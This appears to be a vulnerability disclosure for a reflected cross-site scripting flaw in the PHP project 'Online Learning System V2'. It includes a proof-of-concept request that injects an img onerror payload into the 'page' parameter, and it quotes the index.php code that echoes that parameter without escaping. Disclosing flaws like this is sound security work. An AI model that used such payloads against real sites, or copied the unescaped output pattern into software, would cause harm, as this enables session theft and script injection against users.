### Online Learning System V2 - XSS

### Date: 2024-02/27
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/14929/online-learning-system-v2-using-php-free-source-code.html
### Tested on: MacOs13.5 + phpstudy

# /index.php（XSS）

### Sample request POC #1

```
http://127.0.0.1:8889/?page=a/%3Cimg%20src=%22%22%20onerror=%22alert(1)%22%3E
```

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1709030825512.jpg "Online Learning System V2")

### Vulnerability code
index.php:19
```
<!DOCTYPE html>
<html lang="en" class="" style="height: auto;">
<?php require_once('config.php'); ?>
 <?php require_once('inc/header.php') ?>
  <body class="hold-transition layout-top-nav" >
    <div class="wrapper">
     <?php require_once('inc/topBarNav.php') ?>
              
     <?php $page = isset($_GET['page']) ? $_GET['page'] : 'portal';  ?>
      <!-- Content Wrapper. Contains page content -->
      <div class="content-wrapper" style="min-height: 567.854px;">
        <!-- Content Header (Page header) -->
        <div class="content-header">
          <div class="container">
            <div class="row mb-2">
              <div class="col-sm-6">
                <h1 class="m-0"><?php 
$_p = explode("/",$page);
echo (isset($_p[1])) ? ucwords(str_replace("_", " ",$_p[1])) : ucwords(str_replace("_", " ",$_p[0])) ;
?></h1>
...
```
